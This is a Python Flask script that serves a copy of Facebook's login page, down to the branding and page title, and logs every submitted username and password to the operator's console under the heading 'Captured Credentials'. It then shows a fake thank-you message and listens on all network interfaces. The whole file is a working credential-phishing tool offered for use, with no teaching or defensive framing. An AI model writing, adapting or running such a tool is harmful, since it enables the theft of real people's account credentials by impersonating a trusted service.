from flask import Flask, request, render_template_string
from colorama import Fore, Style, init
import os

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)

# HTML template for a Facebook-like login page
login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 980px;
            margin: auto;
        }
        .header {
            display: flex;
            align-items: center;
            width: 100%;
            padding: 20px;
            background-color: #1877f2;
        }
        .header .logo {
            color: white;
            font-size: 36px;
            font-weight: bold;
            text-align: left;
            margin-left: 10px;
        }
        .login-section {
            display: flex;
            width: 100%;
            margin-top: 50px;
            justify-content: space-between;
        }
        .login-box {
            width: 400px;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            transition: box-shadow 0.3s;
        }
        .login-box:hover {
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
        }
        .login-box form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
        }
        .login-box input[type="text"],
        .login-box input[type="password"] {
            padding: 14px;
            font-size: 16px;
            border: 1px solid #ccd0d5;
            border-radius: 6px;
            outline: none;
            transition: border-color 0.3s;
        }
        .login-box input[type="text"]:focus,
        .login-box input[type="password"]:focus {
            border-color: #1877f2;
        }
        .login-box input[type="submit"] {
            background-color: #1877f2;
            color: white;
            font-size: 18px;
            font-weight: bold;
            padding: 14px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .login-box input[type="submit"]:hover {
            background-color: #165db8;
        }
        .login-box .forgot-password {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin-top: 10px;
            transition: color 0.3s;
        }
        .login-box .forgot-password:hover {
            color: #0b4a94;
        }
        .signup-link {
            margin-top: 20px;
            font-size: 16px;
        }
        .signup-link a {
            color: #1877f2;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.3s;
        }
        .signup-link a:hover {
            color: #0b4a94;
        }
        .benefits {
            max-width: 600px;
            text-align: left;
            margin-right: 20px;
        }
        .benefits h2 {
            color: #1877F2;
            font-size: 36px;
            margin-bottom: 10px;
        }
        .benefits p {
            font-size: 18px;
            color: #333;
            line-height: 1.6;
        }

        /* Tablet responsive */
        @media (max-width: 768px) {
            .login-section {
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            .benefits {
                margin-right: 0;
                margin-bottom: 20px;
            }
        }

        /* Mobile responsive */
        @media (max-width: 480px) {
            .login-section {
                flex-direction: column;
                align-items: center;
            }
            .login-box {
                width: 100%;
                padding: 20px;
            }
            .benefits {
                text-align: center;
                margin-bottom: 20px;
            }
            .benefits h2 {
                font-size: 28px;
            }
            .benefits p {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-section">
            <div class="benefits">
                <h2>Facebook.</h2>
                <p>See photos and updates from friends in News Feed.
                Share what's new in your life on your Timeline.</p>
            </div>
            <div class="login-box">
                <form method="POST">
                    <input type="text" name="username" placeholder="Email or Phone Number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="submit" value="Log In">
                </form>
                <a href="#" class="forgot-password">Forgot Password?</a>
                <div class="signup-link">
                    <span>Don't have an account? <a href="#">Sign up</a></span>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Capture submitted credentials
        username = request.form["username"]
        password = request.form["password"]
        
        # Define column widths
        col_widths = [20, 40]  # Adjust widths as needed

        # Create a formatted string with colons and colors
        formatted_credentials = (
            f"{Fore.YELLOW}Captured Credentials:{Style.RESET_ALL}\n"
            f"{Fore.CYAN}{'Username:'.ljust(col_widths[0])} {Style.RESET_ALL}{username}\n"
            f"{Fore.CYAN}{'Password:'.ljust(col_widths[0])} {Style.RESET_ALL}{password}"
        )
        
        print(formatted_credentials)
        return "Thank you for logging in!"  # Redirect to a thank-you page
    return render_template_string(login_page)

def clear_terminal():
    # Clear the terminal window
    os.system('cls' if os.name == 'nt' else 'clear')

def print_welcome_message():
    print(f"{Fore.YELLOW}Welcome to the Flask Login Page!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}The server is starting...{Style.RESET_ALL}")

if __name__ == "__main__":
    clear_terminal()
    print_welcome_message()
    app.run(host="0.0.0.0", port=5000)

